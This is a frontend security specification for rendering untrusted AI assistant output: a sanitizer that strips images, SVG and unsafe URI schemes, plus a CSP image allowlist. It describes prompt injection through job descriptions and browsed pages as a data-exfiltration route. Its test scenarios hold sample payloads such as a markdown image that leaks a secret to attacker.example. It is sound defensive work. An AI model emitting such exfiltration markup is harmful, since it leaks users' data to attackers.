# assistant-output-rendering Specification

## Purpose

How untrusted model output reaches the DOM. Surfaces that render model prose — the assistant
chat and the fit-analysis verdict — read job descriptions, browsed pages, and other text an
attacker controls end to end, so anything the model writes may be an attacker's words in the
model's mouth. Two layers keep that from becoming a request the viewer never asked to make:
the sanitizer applied to model markdown before `{@html}`, and the CSP image allowlist behind it.
## Requirements
### Requirement: Assistant model output renders as inert markup

The assistant SHALL render model output through a sanitizer policy that strips every element and
URI scheme capable of triggering a network request or executing code, because model output is
untrusted: the model reads job descriptions, arbitrary browsed pages, and other text an attacker
controls end to end, so anything it writes may be an attacker's words in the model's mouth.

The policy MUST drop `img`, `picture`, `source`, `video`, `audio`, `iframe`, `object`, `embed`,
`form`, `svg`, and `use`, and MUST admit only the `http`, `https`, and `mailto` URI schemes plus
relative URLs. It applies to every sink that renders model output as markup — the answer body and
the thinking block alike — and to partial output during streaming, not only to the settled turn.
This mirrors the ban the ingest sanitizer already applies to job description HTML, and for the
same reason: a rendered image is a request the viewer never asked to make.

Ordinary prose formatting is unaffected: headings, lists, tables, emphasis, code, and links still
render, and links the model writes still open in a new tab.

#### Scenario: A markdown image never reaches the DOM

- **WHEN** the model writes `![x](https://attacker.example/leak?d=secret)` in its answer
- **THEN** the rendered markup contains no `img` element and the browser issues no request to that host

#### Scenario: Raw HTML media is dropped too

- **WHEN** the model writes a literal `<img src="https://attacker.example/p.gif">` or `<svg><use href="https://attacker.example/u">`
- **THEN** both are removed from the rendered markup

#### Scenario: The thinking block is sanitized on the same policy

- **WHEN** model output containing an image reaches the thinking block rather than the answer body
- **THEN** it is stripped there as well

#### Scenario: A request fires from no partially streamed answer

- **WHEN** an answer carrying an image arrives token by token and is re-rendered on each update
- **THEN** no intermediate render emits the image

#### Scenario: A non-http scheme is refused

- **WHEN** the model writes a link whose scheme is `javascript:` or `data:`
- **THEN** the rendered anchor does not carry that URI

#### Scenario: A relative link keeps its target

- **WHEN** the model writes a link to `/my/profile`, `#section`, or `jobs/go-dev`
- **THEN** the anchor keeps that href — a relative URL is same-origin by definition and carries nothing off the site

#### Scenario: Ordinary formatting survives

- **WHEN** the model writes headings, a bullet list, bold text, a code block, and an `https` link
- **THEN** all of them render, and the link carries `target="_blank"` and `rel="noopener noreferrer"`

### Requirement: The frontend CSP restricts image loads to known hosts

The frontend Content-Security-Policy SHALL declare an `img-src` allowlist, so that an image the
sanitizer fails to strip still cannot reach a host of the attacker's choosing. The allowlist
covers the origin itself, `data:` URIs, and the company-logo proxy — the only hosts the browser
legitimately loads images from, since OG cards are rendered server-side and never fetched by the
browser under this policy.

`connect-src` SHALL remain unset. With no `default-src`, leaving it unset is what keeps the Sentry
ingest host, GA's collect endpoint, and the same-origin PostHog `/ingest` proxy reachable;
introducing it without enumerating all three would silently break error reporting and analytics.

#### Scenario: An image from an unlisted host is blocked

- **WHEN** a page attempts to load an image from a host outside the allowlist
- **THEN** the browser refuses the request

#### Scenario: Company logos and template previews still load

- **WHEN** a page renders a company logo from the logo proxy, or a CV template preview from the origin
- **THEN** both load normally

#### Scenario: Error reporting and analytics keep their egress

- **WHEN** the CSP is served
- **THEN** it declares no `connect-src` and no `default-src`, leaving Sentry, GA, and PostHog delivery unrestricted
